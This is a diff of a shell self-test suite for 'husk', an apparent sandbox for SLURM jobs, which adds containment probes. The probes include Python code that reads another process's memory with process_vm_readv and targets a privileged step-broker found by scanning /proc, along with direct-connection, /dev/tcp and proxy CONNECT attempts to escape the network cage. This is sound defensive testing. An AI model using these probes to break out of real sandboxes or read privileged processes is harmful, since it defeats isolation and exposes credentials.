+fn = getattr(libc, "process_vm_" + sys.argv[1] + "v")
+fn.restype = ctypes.c_ssize_t
+fn.argtypes = [ctypes.c_int, ctypes.POINTER(Iov), ctypes.c_ulong,
+               ctypes.POINTER(Iov), ctypes.c_ulong, ctypes.c_ulong]
+src = ctypes.create_string_buffer(b"husk-cma-probe")
+dst = ctypes.create_string_buffer(len(src))
+a = Iov(ctypes.cast(src, ctypes.c_void_p), len(src))
+b = Iov(ctypes.cast(dst, ctypes.c_void_p), len(src))
+local, remote = (b, a) if sys.argv[1] == "read" else (a, b)
+n = fn(os.getpid(), ctypes.byref(local), 1, ctypes.byref(remote), 1, 0)
+sys.exit(0 if n == len(src) and dst.raw == src.raw else 2)
+PY
+  }
+  # ulimit -c 0: the blocked half dies on SIGSYS, and a core file dropped in the
+  # workdir would be noise in a test whose whole output is what the job left behind.
+  ( ulimit -c 0 2>/dev/null; husk_cma read ) >/dev/null 2>&1
+  cma_r=$?
+  ( ulimit -c 0 2>/dev/null; husk_cma write ) >/dev/null 2>&1
+  cma_w=$?
+  if [ "$cma_r" -eq 0 ]; then
+    echo "RESULT PASS functional cma.read process_vm_readv permitted - MPICH intra-node transfers work"
+  elif [ "$cma_r" -eq 159 ]; then
+    echo "RESULT FAIL functional cma.read process_vm_readv killed by SIGSYS - ICON will die when ranks exchange data; the installed seccomp-wrapper predates the single-node CMA exemption"
+  else
+    echo "RESULT FAIL functional cma.read process_vm_readv failed rc=$cma_r - expected the read to succeed under the single-node profile"
+  fi
+  if [ "$cma_w" -eq 159 ]; then
+    echo "RESULT PASS containment cma.write process_vm_writev killed by SIGSYS - a rank cannot write into the un-caged step-broker"
+  elif [ "$cma_w" -eq 0 ]; then
+    echo "RESULT FAIL containment cma.write process_vm_writev SUCCEEDED - the write half of CMA is open; that is code execution outside the cage"
+  else
+    echo "RESULT INFO containment cma.write process_vm_writev did not succeed but was not SIGSYS (rc=$cma_w) - blocked, cause unclear"
+  fi
+else
+  echo "RESULT INFO functional cma.read no python3 in cage - CMA probe skipped"
+fi
+
+# The check the self-attach probe above CANNOT make. cma.read proves the seccomp filter
+# permits the syscall; it says nothing about whether one rank may actually read another,
+# because a process attaching to ITSELF always passes the kernel ptrace check. That gap is
+# exactly what let the CMA work look finished while ICON still died with EPERM. So: launch
+# a real 2-task step through the stub and have rank 1 read rank 0.
+#
+# The same step answers the other half - a rank must NOT reach the un-caged step-broker,
+# which holds MUNGE and the daemon route. The broker is located by scanning /proc, the way
+# an attacker would, rather than being told where it is.
+if command -v srun >/dev/null 2>&1 && command -v python3 >/dev/null 2>&1; then
+  cat > __WORKDIR__/husk-cma-step.py <<"PY"
+import ctypes, os, sys, time
+
+class Iov(ctypes.Structure):
+    _fields_ = [("base", ctypes.c_void_p), ("len", ctypes.c_size_t)]
+
+libc = ctypes.CDLL("libc.so.6", use_errno=True)
+libc.process_vm_readv.restype = ctypes.c_ssize_t
+libc.process_vm_readv.argtypes = [ctypes.c_int, ctypes.POINTER(Iov), ctypes.c_ulong,
+                                  ctypes.POINTER(Iov), ctypes.c_ulong, ctypes.c_ulong]
+
+def read_from(pid, addr, n):
+    dst = ctypes.create_string_buffer(n)
+    local = Iov(ctypes.cast(dst, ctypes.c_void_p), n)
+    remote = Iov(ctypes.c_void_p(addr), n)
+    ctypes.set_errno(0)
+    got = libc.process_vm_readv(pid, ctypes.byref(local), 1, ctypes.byref(remote), 1, 0)
+    return got, ctypes.get_errno(), dst.raw
+
+def find_step_broker():
+    for d in os.listdir("/proc"):
+        if not d.isdigit():
+            continue
+        try:
+            parts = open("/proc/%s/cmdline" % d, "rb").read().split(b"\0")
+        except OSError:
+            continue
+        if any(b"husk-slurm-broker" in c for c in parts) and b"--step-broker" in parts:
+            return int(d)
+    return 0
+
+def yama_scope():
+    # A ptrace_scope of 1 restricts attachment to DESCENDANTS. Two ranks are siblings
+    # (both children of slurmstepd), so a non-zero scope denies rank-to-rank CMA no matter
+    # what husk does with namespaces. Not every site enables Yama; report the value so a
+    # failure here is attributable instead of being blamed on the cage.
+    try:
+        return open("/proc/sys/kernel/yama/ptrace_scope").read().strip()
+    except OSError:
+        return "none"
+
+work = sys.argv[1]
+rank = int(os.environ.get("SLURM_PROCID", "0"))
+note = os.path.join(work, "husk-cma-rank0")
+CANARY = b"husk-peer-canary"
+
+if rank == 0:
+    buf = ctypes.create_string_buffer(CANARY)
+    tmp = note + ".tmp"
+    fh = open(tmp, "w")
+    fh.write("%d %d %d" % (os.getpid(), ctypes.addressof(buf), len(buf)))
+    fh.close()
+    os.rename(tmp, note)          # appears atomically, so rank 1 never reads half of it
+    time.sleep(25)                # stay alive while rank 1 reads us
+else:
+    print("HUSK-CMA-YAMA %s" % yama_scope())
+    for _ in range(150):
+        if os.path.exists(note):
+            break
+        time.sleep(0.2)
+    if not os.path.exists(note):
+        print("HUSK-CMA-PEERS FAIL rank0 never published")
+    else:
+        pid, addr, n = [int(x) for x in open(note).read().split()]
+        got, err, raw = read_from(pid, addr, n)
+        if got == n and raw.startswith(CANARY):
+            print("HUSK-CMA-PEERS OK")
+        else:
+            print("HUSK-CMA-PEERS FAIL got=%d errno=%d" % (got, err))
+    target = find_step_broker()
+    if target == 0:
+        print("HUSK-CMA-OUTSIDE NOBROKER")
+    else:
+        # Address 0x1000 is deliberately unmapped: EPERM means permission was refused,
+        # any other errno means permission was GRANTED and only the address was bad.
+        got, err, _ = read_from(target, 0x1000, 8)
+        print("HUSK-CMA-OUTSIDE %s errno=%d" % ("DENIED" if err == 1 else "ALLOWED", err))
+PY
+  # --overlap so the step does not queue behind the job step for CPUs, and a timeout so a
+  # step that never starts cannot wedge the whole self-test.
+  rm -f __WORKDIR__/husk-cma-rank0
+  timeout 240 srun -n 2 --overlap python3 __WORKDIR__/husk-cma-step.py __WORKDIR__ \
+      > __WORKDIR__/husk-cma.out 2>&1 || true
+  cma_step=$(cat __WORKDIR__/husk-cma.out 2>/dev/null | tr -d "\r")
+  case "$cma_step" in
+    *"HUSK-CMA-PEERS OK"*)
+      echo "RESULT PASS functional cma.peers one rank read another rank - the job shares a user namespace, MPICH intra-node transfers work" ;;
+    *"HUSK-CMA-PEERS FAIL"*)
+      cma_yama=$(echo "$cma_step" | sed -n "s/^HUSK-CMA-YAMA //p" | head -1)
+      case "${cma_yama:-none}" in
+        0|none)
+          echo "RESULT FAIL functional cma.peers ranks cannot read each other [$(echo "$cma_step" | grep HUSK-CMA-PEERS | head -1)] - ICON will die with EPERM; is the job sharing one user namespace (is the cage holder running)?" ;;
+        *)
+          echo "RESULT INFO functional cma.peers ranks cannot read each other, but yama ptrace_scope=$cma_yama restricts attachment to descendants and ranks are siblings - this node denies rank-to-rank CMA independently of husk" ;;
+      esac ;;
+    *)
+        # Split the no-verdict case by WHY, because the old single arm announced "the
+        # brokered srun path is broken" for a condition that is not husk and not srun:
+        # slurmctld refusing the step because the ALLOCATION is too small. That is the
+        # mistake this file already warns about a few probes down - read the errno before
+        # blaming the layer. With --ntasks=2 requested above, a refusal here means the site
+        # did not grant it, which says nothing about the cage.
+        case "$cma_step" in
+          *"More processors requested"*|*"Unable to create step"*|*"Requested node configuration"*)
+            echo "RESULT INFO functional cma.peers the 2-task step was refused by SLURM for resources, not by husk - the job asked for 2 tasks and did not get them, so rank-to-rank CMA was never exercised. Check the partition defaults [$(echo "$cma_step" | tail -2 | tr "\n" " ")]" ;;
+          *)
+            echo "RESULT FAIL functional cma.peers the 2-task probe step produced no verdict and SLURM gave no resource reason - the brokered srun path is suspect [$(echo "$cma_step" | tail -2 | tr "\n" " ")]" ;;
+        esac ;;
+  esac
+  case "$cma_step" in
+    *"HUSK-CMA-OUTSIDE DENIED"*)
+      echo "RESULT PASS containment cma.outside a rank cannot read the un-caged step-broker - the user namespace boundary holds" ;;
+    *"HUSK-CMA-OUTSIDE ALLOWED"*)
+      echo "RESULT FAIL containment cma.outside a rank CAN read the un-caged step-broker - it holds MUNGE and the daemon route" ;;
+    *"HUSK-CMA-OUTSIDE NOBROKER"*)
+      # Since ranks joined the job PID namespace this is the STRONGEST outcome, not a
+      # skipped check: the rank cannot enumerate the step-broker at all, so there is no
+      # target to attempt. Reporting it as INFO understated a result that is better than
+      # DENIED - denied means addressable and refused; this means not addressable.
+      echo "RESULT PASS containment cma.outside the step-broker is not even visible to a rank - the PID namespace removed the target" ;;
+    *)
+      echo "RESULT INFO containment cma.outside no verdict from the probe step" ;;
+  esac
+  rm -f __WORKDIR__/husk-cma-step.py __WORKDIR__/husk-cma.out __WORKDIR__/husk-cma-rank0
+else
+  echo "RESULT INFO functional cma.peers no srun or python3 in cage - two-cage CMA probe skipped"
+fi
+# EGRESS. The network phase puts exactly one hole in `--unshare-net`, so the thing to
+# prove is not that the hole works but that it is the ONLY one. Three questions, and the
+# first two matter more than the third:
+#   1. is there still no route of our own?  (net.external already asks this)
+#   2. can we reach an UNLISTED host through the proxy?   must be NO
+#   3. can we reach an allowlisted host?                  yes, when configured
+# Reported as INFO when no allowlist is configured, which is the default: absence of
+# egress is not a failure, it is the shipped posture.
+if [ -z "${HUSK_NET_SOCK:-}" ]; then
+  echo "RESULT INFO containment net.egress no allowlist configured - job has no network (default)"
+else
+  if [ -S "$HUSK_NET_SOCK" ]; then
+    echo "RESULT PASS functional net.relay the egress proxy socket exists at $HUSK_NET_SOCK"
+  else
+    echo "RESULT FAIL functional net.relay HUSK_NET_SOCK is set to $HUSK_NET_SOCK but there is no socket there - the proxy did not start; see the husk job log at $HUSK_JOB_LOG"
+  fi
+  # Ask what the RELAY actually uses, not what is on PATH. An earlier version of this arm
+  # ran `command -v socat` and reported "socat is not installed" while husk had bound one
+  # at a path off PATH - true about PATH, wrong about the thing it was describing, and it
+  # sent the diagnosis in the wrong direction for a round.
+  # Check the IN-CAGE path, which is a constant, not $HUSK_SOCAT. Since 2026-08-02
+  # HUSK_SOCAT carries the HOST SOURCE so the step-broker can hand it to ranks, which bind
+  # it into their own cages; the host path is under /users and is correctly INVISIBLE in
+  # the cage. This arm asserted the old contract and failed on a job whose egress was
+  # working - net.live fetched 21140 bytes in the same run. A test that pins a contract
+  # the code has moved past reports a breach where there is none.
+  if [ -x /tmp/husk-socat ]; then
+    echo "RESULT PASS functional net.socat the relay binary is bound into the cage at /tmp/husk-socat"
+  elif [ -n "${HUSK_NET_SOCK:-}" ]; then
+    echo "RESULT FAIL functional net.socat no relay binary at /tmp/husk-socat although egress is configured - the bind did not take, so this job has no network"
+  else
+    echo "RESULT INFO functional net.socat no egress configured for this job - no relay binary expected"
+  fi
+  # ...and the proxy variables should follow from it.
+  if [ -n "${HTTPS_PROXY:-}" ]; then
+    echo "RESULT PASS functional net.proxyenv the job environment points at the relay [$HTTPS_PROXY]"
+  else
+    echo "RESULT FAIL functional net.proxyenv no HTTPS_PROXY in the job - the relay never started, so nothing will use the allowlist"
+  fi
+  # The proxy is the ONLY way out: the cage has no route, so a direct connection must
+  # still fail even though egress is now configured. If this ever passes, the hole is not
+  # the only hole.
+  if python3 - <<"PY" >/dev/null 2>&1
+import socket
+socket.setdefaulttimeout(4)
+socket.create_connection(("1.1.1.1", 443))
+PY
+  then
+    echo "RESULT FAIL containment net.direct a caged job reached the internet WITHOUT the proxy - --unshare-net is not holding"
+  else
+    echo "RESULT PASS containment net.direct no direct route out of the cage; the proxy is the only path"
+  fi
+  # An unlisted host must be refused BY THE PROXY, with 403 rather than a timeout: a
+  # refusal that looks like a network fault costs somebody an afternoon.
+  _egress_unlisted=$(python3 - <<"PY" 2>&1
+import socket, os, sys
+try:
+    s = socket.socket(socket.AF_UNIX); s.settimeout(6)
+    s.connect(os.environ["HUSK_NET_SOCK"])
+    s.sendall(b"CONNECT husk-should-never-reach-this.example.com:443 HTTP/1.1\r\n\r\n")
+    print(s.recv(80).decode(errors="replace").split("\r\n")[0])
+except Exception as e:
+    print("PROBE-ERROR %s: %s" % (type(e).__name__, e))
+PY
+)
+  case "$_egress_unlisted" in
+    *403*) echo "RESULT PASS containment net.allowlist an unlisted host is refused by the proxy [$_egress_unlisted]" ;;
+    *200*) echo "RESULT FAIL containment net.allowlist the proxy TUNNELLED to an unlisted host [$_egress_unlisted]" ;;
+    *)     echo "RESULT FAIL containment net.allowlist no verdict from the proxy for an unlisted host [$_egress_unlisted]" ;;
+  esac
+  # A LIVE fetch of the shipped default entry, through the proxy, from inside the cage.
+  # This is the only arm that proves the chain end to end rather than proving a refusal.
+  #
+  # Failure here is reported as INFO, not FAIL, and the distinction matters: the proxy runs
+  # ON THE COMPUTE NODE, so if that node has no route to the internet — which is normal on
+  # many HPC systems — then husk is working perfectly and there is simply nothing upstream.
+  # A FAIL would blame the cage for how the site chose to build its network.
+  _egress_live=$(python3 - <<"PY" 2>&1
+import urllib.request, socket
+socket.setdefaulttimeout(25)
+try:
+    r = urllib.request.urlopen("https://opendatadocs.meteoswiss.ch/", timeout=25)
+    print("OK %d %d" % (r.status, len(r.read())))
+except Exception as e:
+    print("ERR %s %s" % (type(e).__name__, str(e)[:80]))
+PY
+)
+  case "$_egress_live" in
+    "OK 200"*) echo "RESULT PASS functional net.live fetched the allowlisted host through the proxy [$_egress_live]" ;;
+    *)         echo "RESULT INFO functional net.live could not fetch the allowlisted host [$_egress_live] - husk refuses nothing here, so this is most likely a compute node with no route to the internet" ;;
+  esac
+  # ...and the scheduler stays unreachable even if some allowlist entry named its host.
+  _egress_sched=$(python3 - <<"PY" 2>&1
+import socket, os, sys
+try:
+    s = socket.socket(socket.AF_UNIX); s.settimeout(6)
+    s.connect(os.environ["HUSK_NET_SOCK"])
+    s.sendall(b"CONNECT localhost:6817 HTTP/1.1\r\n\r\n")
+    print(s.recv(80).decode(errors="replace").split("\r\n")[0])
+except Exception as e:
+    print("PROBE-ERROR %s: %s" % (type(e).__name__, e))
+PY
+)
+  case "$_egress_sched" in
+    *403*) echo "RESULT PASS containment net.scheduler a SLURM daemon port is refused by the proxy (AV8) [$_egress_sched]" ;;
+    *)     echo "RESULT FAIL containment net.scheduler the proxy did not refuse a SLURM daemon port [$_egress_sched]" ;;
+  esac
 fi
 echo "===HUSK-PROBE-END==="
 '
@@ -602,6 +2029,166 @@ echo "===HUSK-PROBE-END==="
     # directly and this probe would reach the net (FAIL).
     WRAP_BODY='echo ===HUSK-PROBE-BEGIN===; echo "FP wrap_resandboxed ${_HUSK_RESANDBOXED:-0}"; if timeout 5 bash -c ": < /dev/tcp/1.1.1.1/443" 2>/dev/null; then echo "RESULT FAIL containment wrap.caged --wrap job reached the network (NOT caged - F27 regressed)"; else echo "RESULT PASS containment wrap.caged --wrap job ran through the guard, caged (no net)"; fi; echo ===HUSK-PROBE-END==='
     run_live_probe wrapprobe "[\"--partition=$PART\"]" "$WORK" "$WRAP_BODY" wrap
+
+    # THE ACCUMULATION CHECK. The guard cleans up its node-local egress directory at the
+    # END of a job, so no job can observe its own cleanup, and the directory lives on the
+    # COMPUTE node where the login shell cannot see it. So: ask a SECOND job, pinned to the
+    # same node, whether the FIRST job's directory is still there.
+    #
+    # Node-local /tmp is the right home for a per-job socket only if it is reliably removed
+    # — compute-node SSDs are small and the nodes restart rarely, so a directory that fails
+    # to clean up accumulates across every user of that node. That is the risk this arm
+    # exists for, and nothing else in the suite can see it.
+    #
+    # It looks for the KNOWN probe job's directory, never "any husk directory": another of
+    # this user's jobs could legitimately be running on the same node with a live one, and
+    # a check that cannot tell those apart would cry wolf.
+    #
+    # THIS ONE JOB IS DELIBERATELY *NOT* BROKERED, AND THAT IS THE WHOLE POINT.
+    # The first version of this arm went through the broker like every other probe, so it
+    # ran INSIDE the cage - and the cage mounts `--tmpfs /tmp`, with only the egress SOCKET
+    # bound back in, never the directory. A caged probe therefore looks for the previous
+    # job's directory in a fresh, empty tmpfs and cannot find it whether or not the leak is
+    # real: it reported PASS unconditionally. The observer has to be OUTSIDE the boundary
+    # whose leakage it is measuring, and the selftest is the trusted layer, so it submits
+    # this one with plain sbatch. Same reason the process check below can work at all.
+    if [ -z "${PROBE_NODE:-}" ] || [ -z "${PROBE_JID:-}" ]; then
+      check SKIP containment tmp.reclaimed "no probe node/job recorded - cannot pin the follow-up job"
+    else
+      LSCRIPT="$WORK/husk-leftover.sh"
+      # Quoted heredoc: nothing expands here, the job id travels in the ENVIRONMENT via
+      # --export. An unquoted heredoc has interpolated a value at file-creation time more
+      # than once in this suite.
+      cat > "$LSCRIPT" <<'HUSKLEFT'
+#!/bin/bash
+# Written by husk selftest.sh. Runs UNCAGED on purpose - see the call site.
+echo ===HUSK-PROBE-BEGIN===
+jid="${HUSK_PROBE_JID:-}"
+d="/tmp/husk-$(id -u)-$jid"
+if [ -d "$d" ]; then
+  echo "RESULT FAIL containment tmp.reclaimed $d survived job $jid on $(hostname) - node-local scratch accumulates"
+else
+  echo "RESULT PASS containment tmp.reclaimed job $jid left no /tmp directory behind on $(hostname)"
+fi
+# Stray PROCESSES from the finished job. The namespace holder child was orphaned on every
+# job until 9faad58, and what actually reaped it was SLURM cgroup proctrack - an unstated
+# dependency on site configuration. Assert the outcome instead of assuming it.
+# pgrep WITHOUT -f, so it matches comm and cannot match this script by its own text.
+# Each candidate is attributed by its OWN SLURM_JOB_ID, so a different live job of ours on
+# this node is not mistaken for a leak.
+stray=0
+for c in husk-slurm-brok socat; do
+  for p in $(pgrep -u "$(id -u)" "$c" 2>/dev/null); do
+    e="/proc/$p/environ"
+    [ -r "$e" ] || continue
+    if tr "\0" "\n" < "$e" 2>/dev/null | grep -qx "SLURM_JOB_ID=$jid"; then
+      stray=$((stray + 1))
+      echo "husk-selftest: leaked $c pid $p from job $jid"
+    fi
+  done
+done
+if [ "$stray" -gt 0 ]; then
+  echo "RESULT FAIL containment proc.reclaimed $stray husk process(es) from job $jid still alive on $(hostname)"
+else
+  echo "RESULT PASS containment proc.reclaimed job $jid left no husk process behind on $(hostname)"
+fi
+echo ===HUSK-PROBE-END===
+HUSKLEFT
+      chmod +x "$LSCRIPT"
+      LARGS=(--parsable --partition="$PART" --nodelist="$PROBE_NODE" --time=00:02:00
+             --nodes=1 --chdir="$WORK" --output="$WORK/slurm-%j.out"
+             --export="ALL,HUSK_PROBE_JID=$PROBE_JID")
+      [ -n "$ACCT" ] && LARGS+=(--account="$ACCT")
+      # SANTIS: `sbatch` from inside a uenv session is refused outright unless the uenv is
+      # named explicitly — "Calling sbatch/salloc from inside a uenv session is disallowed".
+      # The BROKER never trips this because it always forces --uenv/--view from the trusted
+      # session; this job bypasses the broker on purpose, so it has to do the same thing
+      # itself. Same normalisation as `session.rs::normalize_view`: UENV_VIEW is
+      # mount-qualified (/user-environment:icon:default) and only the part after the first
+      # colon is a legal --view.
+      # UENV_LABEL with UENV_MOUNT_LIST as the fallback, because that is exactly what
+      # `session.rs` does — Balfrin reports no label but does set the mount list. One origin
+      # for the value, not two reconstructions that drift.
+      _lu="${UENV_LABEL:-${UENV_MOUNT_LIST:-}}"
+      if [ -n "$_lu" ]; then
+        LARGS+=(--uenv="$_lu")
+        _lv="${UENV_VIEW:-}"
+        case "$_lv" in /*:*) _lv="${_lv#*:}" ;; esac
+        [ -n "$_lv" ] && LARGS+=(--view="$_lv")
+      fi
+      LJID="$(sbatch "${LARGS[@]}" "$LSCRIPT" 2>&1)"
+      LJID="${LJID%%;*}"
+      case "$LJID" in
+        ''|*[!0-9]*)
+          check SKIP containment tmp.reclaimed "follow-up job not submitted: $(printf '%s' "$LJID" | head -c 70)"
+          check SKIP containment proc.reclaimed "follow-up job not submitted"
+          ;;
+        *)
+          # 30s cap: if someone else holds the node the job stays queued, and that says
+          # nothing about husk. Skipping beats a red arm nobody can act on.
+          _w=0
+          while squeue -h -j "$LJID" 2>/dev/null | grep -q . && [ "$_w" -lt 30 ]; do sleep 1; _w=$((_w+1)); done
+          if squeue -h -j "$LJID" 2>/dev/null | grep -q .; then
+            scancel "$LJID" >/dev/null 2>&1
+            check SKIP containment tmp.reclaimed "follow-up job did not start on $PROBE_NODE within 30s (node busy) - cancelled"
+            check SKIP containment proc.reclaimed "follow-up job did not start on $PROBE_NODE within 30s (node busy)"
+          else
+            sleep 1
+            LOUT="$WORK/slurm-$LJID.out"
+            if [ -f "$LOUT" ]; then
+              _seen_tmp=0; _seen_proc=0
+              while IFS= read -r line; do
+                case "$line" in
+                  "RESULT "*)
+                    read -r _kw v tt id rest <<<"$line"
+                    check "$v" "$tt" "$id" "$rest"
+                    [ "$id" = tmp.reclaimed ] && _seen_tmp=1
+                    [ "$id" = proc.reclaimed ] && _seen_proc=1
+                    ;;
+                esac
+              done < "$LOUT"
+              # An arm that never reported is not a pass. The uncaged follow-up can fail in
+              # ways the caged one could not (no such script, a site prolog killing it), and
+              # silence used to look like green.
+              [ "$_seen_tmp" = 1 ] || check SKIP containment tmp.reclaimed "follow-up job produced no tmp.reclaimed line"
+              [ "$_seen_proc" = 1 ] || check SKIP containment proc.reclaimed "follow-up job produced no proc.reclaimed line"
+            else
+              check SKIP containment tmp.reclaimed "no output from the follow-up job at $LOUT"
+              check SKIP containment proc.reclaimed "no output from the follow-up job at $LOUT"
+            fi
+          fi
+          ;;
+      esac
+    fi
+
+    # The step pair, end to end, by SHELLING OUT to srun-probe.sh rather than
+    # reimplementing it here. That script is what a human runs by hand when steps
+    # misbehave, so a second copy of its checks would be a second thing to keep in step
+    # with the step-broker - and it is the copy that drifts which reports green while the
+    # real path is broken.
+    run_srun_probe "$WORK"
+
+    # Same shape, for the other place a second parser reads husk's input: slurmd's own
+    # reading of the `#SBATCH` lines husk forwarded.
+    run_directive_parity_probe
+    run_query_parity_probe
+
+    # THE STEP SPOOL, AFTER REAL JOBS. `guard.spool_removed` runs the guard on the LOGIN
+    # node, so it proves the cleanup code works - not that it ran after a job that SLURM
+    # started, signalled and tore down on a compute node. That gap is not hypothetical: a
+    # real ICON run left `.husk-step-spool-4992187` behind with a socat still in it, and
+    # nothing in the suite would have noticed.
+    #
+    # The spool lives in the WORKDIR, on the shared filesystem, so unlike the node-local
+    # /tmp directory it needs no second job - the login node can simply look. Every
+    # brokered job above has finished by now, and the uncaged follow-up job runs no guard,
+    # so anything still here is a leak.
+    SLEFT="$(ls -d "$WORK"/.husk-step-spool-* 2>/dev/null | tr '\n' ' ')"
+    if [ -z "$SLEFT" ]; then
+      check PASS containment job.spool_reclaimed "no step spool survived a real compute job in $WORK"
+    else
+      check FAIL containment job.spool_reclaimed "step spool(s) left by a real job: $SLEFT holding $(ls -A $SLEFT 2>/dev/null | tr '\n' ' ')"
+    fi
   fi
 else
   echo
@@ -629,10 +2216,45 @@ for i in "${!R_ID[@]}"; do
   printf '  %-4s %-11s %-24s %s\n' "${R_VERD[$i]}" "${R_TIER[$i]}" "${R_ID[$i]}" "${R_DET[$i]}"
 done
 echo "----------------------------------------------------------------------"
-echo "SUMMARY  pass=$PASS  fail=$FAIL  skip=$SKIP  info=$INFO"
+# THE SIBLING OF `B6-4`, in this file. `smoke.c` has printed a machine-greppable
+# `summary: N failed, M skipped` line since it was written, with a comment saying it exists
+# because the exit status cannot show a SKIP — and `build_and_test.sh` never read it until
+# this round. Here the exit status is `[ "$FAIL" -eq 0 ]`, which is blind to SKIP and INFO
+# in exactly the same way, and CLUSTER-TEST-PLAN's release criterion 1 is `0 FAIL`.
+#
+# The fix is NOT to fail the run on a SKIP. A skip here is usually a legitimate absence (no
+# `scontrol` in this shell, one partition configured, no python3) and the plan says so; a
+# gate that refused those would be an instrument denying service to its operator. What was
+# missing is that the skip was UNNAMED, so "an arm that used to pass and now SKIPs" — which
+# the plan asks the reader to diff against the last bring-up — could not be greped for.
+# So: name them, name the INFOs, and state the arm count so a vanished arm is visible as a
+# number (`B7-10` is the per-arm half of that and is not fixed here).
+_skipped_ids=""; _info_ids=""
+for i in "${!R_ID[@]}"; do
+  case "${R_VERD[$i]}" in
+    SKIP) _skipped_ids="$_skipped_ids ${R_ID[$i]}" ;;
+    PASS|FAIL) : ;;
+    *)    _info_ids="$_info_ids ${R_ID[$i]}" ;;
+  esac
+done
+echo "SKIPPED :${_skipped_ids:- (none)}"
+echo "INFO    :${_info_ids:- (none)}"
+echo "SUMMARY  pass=$PASS  fail=$FAIL  skip=$SKIP  info=$INFO  arms=${#R_ID[@]}"
+echo "NOTE     exit 0 = all arms measured and passed | 1 = a FAIL | 3 = arms went UNMEASURED."
+# Only when it happened. A run that exited 1 printing "0 live job(s) never ran" describes a
+# state it is not in, and a note that fires on every run is a note nobody reads.
+if [ "$UNMEASURED" -gt 0 ]; then
+  echo "NOTE     $UNMEASURED live job(s) never ran, so part of the containment claim was NOT"
+  echo "NOTE     tested. Re-run before reading this as green; SKIPPED names what went untested."
+fi
 if [ -s "$BROKER_LOG" ]; then
   echo "---- broker audit log (stderr) ----"
   sed 's/^/  /' "$BROKER_LOG"
 fi
 
-[ "$FAIL" -eq 0 ]
+# Green means measured AND passed. Before this, a probe job that never started dropped its
+# arms silently and the run could exit 0 having tested none of the containment claim -
+# `arms=` was the only witness, and its correct value differs per cluster.
+if [ "$FAIL" -gt 0 ]; then exit 1; fi
+if [ "$UNMEASURED" -gt 0 ]; then exit 3; fi
+exit 0
